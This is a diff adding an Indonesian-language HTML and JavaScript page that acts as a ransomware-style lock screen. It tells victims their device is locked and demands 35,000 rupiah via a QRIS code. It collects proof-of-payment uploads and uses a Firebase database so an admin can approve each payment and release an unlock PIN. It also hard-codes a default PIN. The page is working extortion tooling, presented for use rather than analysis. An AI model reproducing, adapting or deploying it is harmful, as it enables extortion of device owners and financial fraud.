@@ -1,0 +1,934 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>🔒 Perangkat Terkunci 🔒</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Tambahkan Firebase -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+        /* KEEP ALL YOUR EXISTING CSS STYLES */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #000000;
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+        }
+        
+        .lock-screen {
+            width: 100%;
+            max-width: 380px;
+            background: #111111;
+            border-radius: 20px;
+            padding: 20px;
+            box-shadow: 0 0 30px rgba(0, 255, 255, 0.2);
+            text-align: center;
+            border: 1px solid rgba(0, 255, 255, 0.1);
+        }
+        
+        .header {
+            margin-bottom: 15px;
+        }
+        
+        .logo {
+            font-size: 35px;
+            margin-bottom: 8px;
+            color: #00ffaa;
+        }
+        
+        .time {
+            font-size: 40px;
+            font-weight: 300;
+            margin-bottom: 3px;
+            color: #ffffff;
+            letter-spacing: 1px;
+        }
+        
+        .date {
+            font-size: 14px;
+            color: #888888;
+            margin-bottom: 12px;
+        }
+        
+        /* QRIS Container - 1762x2480 Ratio (1762/2480 = 0.7105 = 71.05%) */
+        .qris-container {
+            width: 100%;
+            max-width: 280px;
+            margin: 0 auto 15px;
+            position: relative;
+        }
+        
+        .qris-container::before {
+            content: "";
+            display: block;
+            padding-top: 140.75%;
+        }
+        
+        .qris-image {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            background: white;
+            border-radius: 8px;
+            padding: 10px;
+            border: 2px solid #00ffaa;
+            box-shadow: 0 0 15px rgba(0, 255, 170, 0.3);
+        }
+        
+        .user-info {
+            background: rgba(0, 255, 170, 0.1);
+            padding: 10px 12px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            border: 1px solid rgba(0, 255, 170, 0.2);
+        }
+        
+        .user-text h3 {
+            font-size: 16px;
+            margin-bottom: 5px;
+            color: #00ffaa;
+        }
+        
+        .user-text p {
+            font-size: 12px;
+            color: #aaaaaa;
+            line-height: 1.3;
+        }
+        
+        .tab-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 15px;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 8px;
+            border-radius: 40px;
+        }
+        
+        .tab {
+            padding: 8px 15px;
+            background: transparent;
+            border-radius: 40px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 500;
+            color: #888888;
+            flex: 1;
+            text-align: center;
+            font-size: 14px;
+        }
+        
+        .tab.active {
+            background: #00ffaa;
+            color: #000000;
+            font-weight: 600;
+            box-shadow: 0 3px 10px rgba(0, 255, 170, 0.3);
+        }
+        
+        .content {
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+        
+        .content.active {
+            display: block;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .pin-container {
+            margin-bottom: 10px;
+        }
+        
+        .pin-display {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 15px;
+        }
+        
+        .pin-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            transition: all 0.3s ease;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .pin-dot.filled {
+            background: #00ffaa;
+            box-shadow: 0 0 6px #00ffaa;
+            transform: scale(1.2);
+        }
+        
+        .pin-pad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-bottom: 10px;
+        }
+        
+        .pin-btn {
+            height: 50px;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.05);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 18px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            border: none;
+            color: white;
+            font-weight: 400;
+        }
+        
+        .pin-btn:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+        
+        .pin-btn.delete {
+            color: #ff5555;
+            background: rgba(255, 85, 85, 0.1);
+            font-size: 16px;
+        }
+        
+        .pin-btn.submit {
+            background: #00ffaa;
+            color: #000000;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        .upload-btn {
+            width: 100%;
+            padding: 12px;
+            background: #0096ff;
+            color: #ffffff;
+            border: none;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 12px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .upload-btn:hover {
+            background: #0088dd;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 150, 255, 0.4);
+        }
+        
+        .file-input {
+            display: none;
+        }
+        
+        .file-preview {
+            margin-top: 12px;
+            padding: 10px;
+            border-radius: 8px;
+            background: rgba(0, 150, 255, 0.1);
+            border: 1px solid rgba(0, 150, 255, 0.2);
+            display: none;
+        }
+        
+        .file-preview.show {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+        
+        .file-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 8px;
+        }
+        
+        .file-icon {
+            font-size: 24px;
+            color: #0096ff;
+        }
+        
+        .file-name {
+            font-size: 13px;
+            color: #ffffff;
+            word-break: break-all;
+        }
+        
+        .file-size {
+            font-size: 11px;
+            color: #888888;
+        }
+        
+        .remove-file {
+            background: rgba(255, 85, 85, 0.2);
+            color: #ff5555;
+            border: none;
+            border-radius: 5px;
+            padding: 5px 10px;
+            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .remove-file:hover {
+            background: rgba(255, 85, 85, 0.3);
+        }
+        
+        .auto-verify-btn {
+            width: 100%;
+            padding: 12px;
+            background: #00cc88;
+            color: #000000;
+            border: none;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 12px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .auto-verify-btn:hover {
+            background: #00bb77;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 204, 136, 0.4);
+        }
+        
+        .auto-verify-btn:disabled {
+            background: #666666;
+            color: #999999;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .payment-status {
+            margin-top: 15px;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .payment-status.processing {
+            background: rgba(255, 170, 0, 0.1);
+            border: 1px solid rgba(255, 170, 0, 0.3);
+            color: #ffcc88;
+            display: block;
+        }
+        
+        .payment-status.approved {
+            background: rgba(0, 255, 170, 0.1);
+            border: 1px solid rgba(0, 255, 170, 0.3);
+            color: #88ffdd;
+            display: block;
+        }
+        
+        .payment-status.rejected {
+            background: rgba(255, 85, 85, 0.1);
+            border: 1px solid rgba(255, 85, 85, 0.3);
+            color: #ff9999;
+            display: block;
+        }
+        
+        .message {
+            margin-top: 10px;
+            padding: 10px;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.05);
+            display: none;
+            border-left: 4px solid transparent;
+            font-size: 13px;
+        }
+        
+        .message.error {
+            background: rgba(255, 85, 85, 0.1);
+            border-left-color: #ff5555;
+            color: #ff9999;
+            display: block;
+        }
+        
+        .message.success {
+            background: rgba(0, 255, 170, 0.1);
+            border-left-color: #00ffaa;
+            color: #88ffdd;
+            display: block;
+        }
+        
+        .message.info {
+            background: rgba(0, 150, 255, 0.1);
+            border-left-color: #0096ff;
+            color: #88ccff;
+            display: block;
+        }
+        
+        .message.warning {
+            background: rgba(255, 170, 0, 0.1);
+            border-left-color: #ffaa00;
+            color: #ffcc88;
+            display: block;
+        }
+        
+        .hint {
+            font-size: 11px;
+            color: #888888;
+            margin-top: 8px;
+            padding: 6px 8px;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 6px;
+        }
+        
+        .scan-hint {
+            font-size: 10px;
+            color: #888888;
+            text-align: center;
+            width: 100%;
+            margin-top: 8px;
+            padding-top: 8px;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        /* Responsive untuk HP */
+        @media (max-width: 480px) {
+            .lock-screen {
+                padding: 15px;
+                border-radius: 15px;
+                max-width: 340px;
+            }
+            
+            .time {
+                font-size: 36px;
+            }
+            
+            .qris-container {
+                max-width: 250px;
+            }
+            
+            .pin-btn {
+                height: 45px;
+                font-size: 17px;
+            }
+            
+            .tab {
+                padding: 7px 12px;
+                font-size: 13px;
+            }
+        }
+        
+        @media (max-width: 360px) {
+            .lock-screen {
+                max-width: 320px;
+            }
+            
+            .qris-container {
+                max-width: 220px;
+            }
+            
+            .pin-btn {
+                height: 42px;
+                font-size: 16px;
+            }
+            
+            .time {
+                font-size: 32px;
+            }
+        }
+        
+        @media (max-height: 700px) {
+            .lock-screen {
+                padding: 15px;
+            }
+            
+            .qris-container {
+                max-width: 240px;
+            }
+            
+            .qris-container::before {
+                padding-top: 130%;
+            }
+            
+            .pin-btn {
+                height: 45px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="lock-screen">
+        <div class="header">
+            <div class="logo">
+                <i class="fas fa-qrcode"></i>
+            </div>
+            <div class="time" id="currentTime">00:00</div>
+            <div class="date" id="currentDate">Senin, 1 Januari 2024</div>
+        </div>
+        
+        <!-- QRIS Container -->
+        <div class="qris-container">
+            <img src="https://files.catbox.moe/sgu563.jpeg" alt="QRIS Code" class="qris-image" id="qrisImage">
+        </div>
+        
+        <div class="user-info">
+            <div class="user-text">
+                <h3>PERANGKAT TERKUNCI</h3>
+                <p>KLIK TOMBOL INFO UNTUK MENDAPATKAN PIN KUNCI LAYAR PERANGKAT ANDA.</p>
+            </div>
+        </div>
+        
+        <div class="tab-container">
+            <div class="tab active" data-tab="pin">
+                <i class="fas fa-key"></i> PIN
+            </div>
+            <div class="tab" data-tab="info">
+                <i class="fas fa-info-circle"></i> Info
+            </div>
+        </div>
+        
+        <!-- PIN Lock Tab -->
+        <div class="content active" id="pin-tab">
+            <div class="pin-container">
+                <div class="pin-display" id="pinDisplay">
+                    <div class="pin-dot"></div>
+                    <div class="pin-dot"></div>
+                    <div class="pin-dot"></div>
+                    <div class="pin-dot"></div>
+                    <div class="pin-dot"></div>
+                    <div class="pin-dot"></div>
+                </div>
+                
+                <div class="pin-pad">
+                    <button class="pin-btn" data-number="1">1</button>
+                    <button class="pin-btn" data-number="2">2</button>
+                    <button class="pin-btn" data-number="3">3</button>
+                    <button class="pin-btn" data-number="4">4</button>
+                    <button class="pin-btn" data-number="5">5</button>
+                    <button class="pin-btn" data-number="6">6</button>
+                    <button class="pin-btn" data-number="7">7</button>
+                    <button class="pin-btn" data-number="8">8</button>
+                    <button class="pin-btn" data-number="9">9</button>
+                    <button class="pin-btn delete" id="deleteBtn">
+                        <i class="fas fa-backspace"></i>
+                    </button>
+                    <button class="pin-btn" data-number="0">0</button>
+                    <button class="pin-btn submit" id="submitBtn">
+                        BUKA
+                    </button>
+                </div>
+            </div>
+            
+            <div class="hint">
+                <i class="fas fa-info-circle"></i> JIKA SUDAH TF MASUKKAN PIN 6 DIGIT YANG OTOMATIS MUNCUL SETELAH MELAKUKAN PEMBAYARAN
+            </div>
+        </div>
+        
+        <!-- Info Tab -->
+        <div class="content" id="info-tab">
+            <div class="user-info" style="background: rgba(0, 150, 255, 0.1); border-color: rgba(0, 150, 255, 0.2);">
+                <h3 style="color: #0096ff;">Informasi QRIS</h3>
+                <p style="text-align: left; margin-top: 8px; font-size: 12px; line-height: 1.4;">
+                    1. Perangkat kamu telah terkunci, Scan QRIS tersebut dan lakukan pembayaran sebesar 35k<br>
+                    2. Jika sudah melakukan pembayaran, Pin kunci layar akan otomatis muncul, dan masukkan pin tersebut untuk membuka kunci perangkat anda<br>
+                    3. Qris bisa di scan melalui E-wallet seperti Dana, Gopay, Ovo, Dll.<br>
+                    4. Setelah memasukkan pin, perangkat otomatis bisa di akses kembali
+                </p>
+            </div>
+            
+            <!-- Tombol Upload Bukti Transfer -->
+            <input type="file" id="transferProof" class="file-input" accept="image/*,.pdf,.jpg,.jpeg,.png">
+            
+            <button class="upload-btn" id="uploadBtn">
+                <i class="fas fa-upload"></i> Upload Bukti Transfer
+            </button>
+            
+            <!-- Preview File -->
+            <div class="file-preview" id="filePreview">
+                <div class="file-info">
+                    <div class="file-icon">
+                        <i class="fas fa-file-invoice"></i>
+                    </div>
+                    <div style="flex: 1;">
+                        <div class="file-name" id="fileName">Nama file akan muncul di sini</div>
+                        <div class="file-size" id="fileSize">Ukuran file</div>
+                    </div>
+                    <button class="remove-file" id="removeFile">
+                        <i class="fas fa-times"></i>
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Tombol Verifikasi Otomatis -->
+            <button class="auto-verify-btn" id="autoVerifyBtn">
+                <i class="fas fa-robot"></i> Verifikasi Otomatis
+            </button>
+            
+            <!-- Status Pembayaran -->
+            <div class="payment-status" id="paymentStatus">
+                <!-- Status akan muncul di sini -->
+            </div>
+        </div>
+        
+        <!-- Message Display -->
+        <div class="message" id="message"></div>
+        
+        <div class="scan-hint">
+            <i class="fas fa-mobile-alt"></i> Buka layar ini di HP lain untuk scan QRIS
+        </div>
+    </div>
+
+    <script>
+        // ==================== KONFIGURASI FIREBASE ====================
+        // GANTI DENGAN KONFIGURASI FIREBASE ANDA
+        const firebaseConfig = {
+            apiKey: "AIzaSyBkE1234567890abcdefghijklmnopqrstuv",
+            authDomain: "qris-payment-system.firebaseapp.com",
+            databaseURL: "https://qris-payment-system-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "qris-payment-system",
+            storageBucket: "qris-payment-system.appspot.com",
+            messagingSenderId: "123456789012",
+            appId: "1:123456789012:web:abcdef1234567890abcdef"
+        };
+        
+        // Inisialisasi Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        
+        // ==================== STATE & VARIABLES ====================
+        const PIN = '112009'; // PIN default
+        let currentPin = '';
+        let savedPin = localStorage.getItem('qrisPin') || PIN;
+        let uploadedFile = null;
+        let paymentVerified = false;
+        let userId = localStorage.getItem('user_id') || 'USER-' + Date.now() + '-' + Math.random().toString(36).substr(2, 5);
+        let currentTransactionId = null;
+        
+        // Simpan user ID
+        localStorage.setItem('user_id', userId);
+        
+        // ==================== DOM ELEMENTS ====================
+        const currentTimeEl = document.getElementById('currentTime');
+        const currentDateEl = document.getElementById('currentDate');
+        const pinDisplayEl = document.getElementById('pinDisplay');
+        const messageEl = document.getElementById('message');
+        const qrisImage = document.getElementById('qrisImage');
+        const transferProofInput = document.getElementById('transferProof');
+        const uploadBtn = document.getElementById('uploadBtn');
+        const filePreview = document.getElementById('filePreview');
+        const fileName = document.getElementById('fileName');
+        const fileSize = document.getElementById('fileSize');
+        const removeFileBtn = document.getElementById('removeFile');
+        const autoVerifyBtn = document.getElementById('autoVerifyBtn');
+        const paymentStatusEl = document.getElementById('paymentStatus');
+        
+        // ==================== FUNGSI UTAMA ====================
+        
+        // Inisialisasi
+        document.addEventListener('DOMContentLoaded', function() {
+            updateDateTime();
+            setInterval(updateDateTime, 1000);
+            checkQrisImage();
+            setupEventListeners();
+        });
+        
+        // Update waktu dan tanggal
+        function updateDateTime() {
+            const now = new Date();
+            const hours = now.getHours().toString().padStart(2, '0');
+            const minutes = now.getMinutes().toString().padStart(2, '0');
+            currentTimeEl.textContent = `${hours}:${minutes}`;
+            
+            const days = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu'];
+            const months = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 
+                           'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember'];
+            
+            currentDateEl.textContent = `${days[now.getDay()]}, ${now.getDate()} ${months[now.getMonth()]} ${now.getFullYear()}`;
+        }
+        
+        // Cek gambar QRIS
+        function checkQrisImage() {
+            const img = new Image();
+            img.onload = function() {
+                console.log('QRIS image loaded successfully');
+                if (!qrisImage.src.includes('?')) {
+                    qrisImage.src = qrisImage.src + '?resize=1762x2480';
+                }
+            };
+            img.onerror = function() {
+                qrisImage.src = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="300" height="300"><rect width="100%" height="100%" fill="white"/><text x="50%" y="50%" font-family="Arial" font-size="24" text-anchor="middle" dy=".3em" fill="black">QRIS Image</text></svg>';
+            };
+            img.src = 'https://files.catbox.moe/sgu563.jpeg';
+        }
+        
+        // Setup event listeners
+        function setupEventListeners() {
+            // Tab switching
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.addEventListener('click', function() {
+                    const tabId = this.getAttribute('data-tab');
+                    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+                    this.classList.add('active');
+                    document.querySelectorAll('.content').forEach(c => c.classList.remove('active'));
+                    document.getElementById(`${tabId}-tab`).classList.add('active');
+                    clearMessage();
+                });
+            });
+            
+            // PIN pad buttons
+            document.querySelectorAll('.pin-btn[data-number]').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    if (currentPin.length < 6) {
+                        const number = this.getAttribute('data-number');
+                        currentPin += number;
+                        updatePinDisplay();
+                        if (currentPin.length === 6) {
+                            setTimeout(checkPin, 300);
+                        }
+                    }
+                });
+            });
+            
+            // Delete button
+            document.getElementById('deleteBtn').addEventListener('click', function() {
+                if (currentPin.length > 0) {
+                    currentPin = currentPin.slice(0, -1);
+                    updatePinDisplay();
+                }
+            });
+            
+            // Submit button
+            document.getElementById('submitBtn').addEventListener('click', checkPin);
+            
+            // Upload button
+            uploadBtn.addEventListener('click', function() {
+                transferProofInput.click();
+            });
+            
+            // File input change
+            transferProofInput.addEventListener('change', function(e) {
+                if (e.target.files.length > 0) {
+                    uploadedFile = e.target.files[0];
+                    showFilePreview(uploadedFile);
+                    autoVerifyBtn.disabled = false;
+                }
+            });
+            
+            // Remove file button
+            removeFileBtn.addEventListener('click', function() {
+                removeUploadedFile();
+                autoVerifyBtn.disabled = true;
+            });
+            
+            // Auto verify button
+            autoVerifyBtn.addEventListener('click', function() {
+                startPaymentProcess();
+            });
+            
+            // Keyboard support
+            document.addEventListener('keydown', function(e) {
+                if (e.key >= '0' && e.key <= '9' && currentPin.length < 6) {
+                    currentPin += e.key;
+                    updatePinDisplay();
+                    if (currentPin.length === 6) {
+                        setTimeout(checkPin, 300);
+                    }
+                } else if (e.key === 'Backspace' && currentPin.length > 0) {
+                    currentPin = currentPin.slice(0, -1);
+                    updatePinDisplay();
+                } else if (e.key === 'Enter' && currentPin.length === 6) {
+                    checkPin();
+                }
+            });
+        }
+        
+        // ==================== SISTEM PEMBAYARAN REAL-TIME ====================
+        
+        // Mulai proses pembayaran
+        function startPaymentProcess() {
+            if (!uploadedFile) {
+                showMessage('Silakan upload bukti transfer terlebih dahulu.', 'error');
+                return;
+            }
+            
+            // Generate PIN acak 6 digit
+            const pin = Math.floor(100000 + Math.random() * 900000).toString();
+            
+            // Buat transaksi baru di Firebase
+            const transactionRef = database.ref('transactions').push();
+            currentTransactionId = transactionRef.key;
+            
+            const transactionData = {
+                userId: userId,
+                userName: 'User_' + userId.substring(0, 6),
+                amount: 35000,
+                status: 'pending', // pending, processing, approved, rejected
+                pin: pin,
+                fileName: uploadedFile.name,
+                fileSize: (uploadedFile.size / (1024 * 1024)).toFixed(2) + ' MB',
+                createdAt: new Date().toISOString(),
+                processedAt: null,
+                processedBy: null
+            };
+            
+            transactionRef.set(transactionData);
+            
+            // Tampilkan status "diproses"
+            showPaymentStatus('processing', '🔄 Pembayaran sedang diproses oleh admin...<br><small>ID: ' + currentTransactionId + '</small>');
+            
+            // Nonaktifkan tombol
+            autoVerifyBtn.disabled = true;
+            autoVerifyBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Menunggu Approval...';
+            
+            // Listen untuk perubahan status dari admin
+            transactionRef.on('value', (snapshot) => {
+                const data = snapshot.val();
+                if (!data) return;
+                
+                if (data.status === 'approved') {
+                    // Pembayaran disetujui admin
+                    paymentVerified = true;
+                    showPaymentStatus('approved', '✅ Pembayaran berhasil!<br><small>PIN Anda: <strong>' + data.pin + '</strong></small>');
+                    
+                    // Update saved pin
+                    savedPin = data.pin;
+                    localStorage.setItem('qrisPin', data.pin);
+                    
+                    // Auto-switch ke tab PIN setelah 3 detik
+                    setTimeout(() => {
+                        document.querySelector('.tab[data-tab="pin"]').click();
+                        // Auto-input PIN
+                        currentPin = data.pin;
+                        updatePinDisplay();
+                        showMessage('PIN telah otomatis dimasukkan! Klik "BUKA" untuk melanjutkan.', 'success');
+                    }, 3000);
+                    
+                    // Hapus file preview
+                    removeUploadedFile();
+                    
+                } else if (data.status === 'rejected') {
+                    // Pembayaran ditolak admin
+                    showPaymentStatus('rejected', '❌ Pembayaran ditolak oleh admin');
+                    autoVerifyBtn.disabled = false;
+                    autoVerifyBtn.innerHTML = '<i class="fas fa-robot"></i> Verifikasi Otomatis';
+                }
+            });
+        }
+        
+        // Tampilkan status pembayaran
+        function showPaymentStatus(type, message) {
+            paymentStatusEl.className = 'payment-status ' + type;
+            paymentStatusEl.innerHTML = `
+                <i class="fas fa-${type === 'processing' ? 'spinner fa-spin' : type === 'approved' ? 'check-circle' : 'times-circle'}"></i>
+                ${message}
+            `;
+            paymentStatusEl.style.display = 'block';
+        }
+        
+        // ==================== FUNGSI BANTU ====================
+        
+        function showFilePreview(file) {
+            const fileSizeMB = (file.size / (1024 * 1024)).toFixed(2);
+            fileName.textContent = file.name;
+            fileSize.textContent = `${fileSizeMB} MB`;
+            filePreview.classList.add('show');
+            showMessage('File berhasil diupload! Klik "Verifikasi Otomatis" untuk melanjutkan.', 'info');
+        }
+        
+        function removeUploadedFile() {
+            uploadedFile = null;
+            transferProofInput.value = '';
+            filePreview.classList.remove('show');
+        }
+        
+        function checkPin() {
+            if (!paymentVerified) {
+                showMessage('Pembayaran belum diverifikasi!', 'error');
+                return;
+            }
+            
+            if (currentPin === savedPin) {
+                showMessage('Akses diberikan! PIN Benar!.', 'success');
+                qrisImage.style.transform = 'scale(1.05)';
+                qrisImage.style.borderColor = '#00ff00';
+                qrisImage.style.boxShadow = '0 0 40px rgba(0, 255, 0, 0.6)';
+                
+                setTimeout(() => {
+                    qrisImage.style.transform = 'scale(1)';
+                    qrisImage.style.borderColor = '#00ffaa';
+                    qrisImage.style.boxShadow = '0 0 20px rgba(0, 255, 170, 0.3)';
+                    currentPin = '';
+                    updatePinDisplay();
+                    clearMessage();
+                }, 2000);
+            } else {
+                showMessage('PIN salah! Coba lagi.', 'error');
+                currentPin = '';
+                updatePinDisplay();
+                qrisImage.style.borderColor = '#ff5555';
+                setTimeout(() => {
+                    qrisImage.style.borderColor = '#00ffaa';
+                }, 500);
+            }
+        }
+        
+        function updatePinDisplay() {
+            const dots = pinDisplayEl.querySelectorAll('.pin-dot');
+            dots.forEach((dot, index) => {
+                if (index < currentPin.length) {
+                    dot.classList.add('filled');
+                } else {
+                    dot.classList.remove('filled');
+                }
+            });
+        }
+        
+        function showMessage(text, type) {
+            messageEl.textContent = text;
+            messageEl.className = 'message ' + type;
+            messageEl.style.display = 'block';
+            
+            if (type === 'info') {
+                setTimeout(clearMessage, 5000);
+            }
+        }
+        
+        function clearMessage() {
+            messageEl.style.display = 'none';
+        }
+        
+        // Refresh QRIS setiap 30 detik
+        setInterval(function() {
+            qrisImage.src = 'https://files.catbox.moe/sgu563.jpeg?resize=1762x2480&t=' + new Date().getTime();
+        }, 30000);
+    </script>
+</body>
+</html>
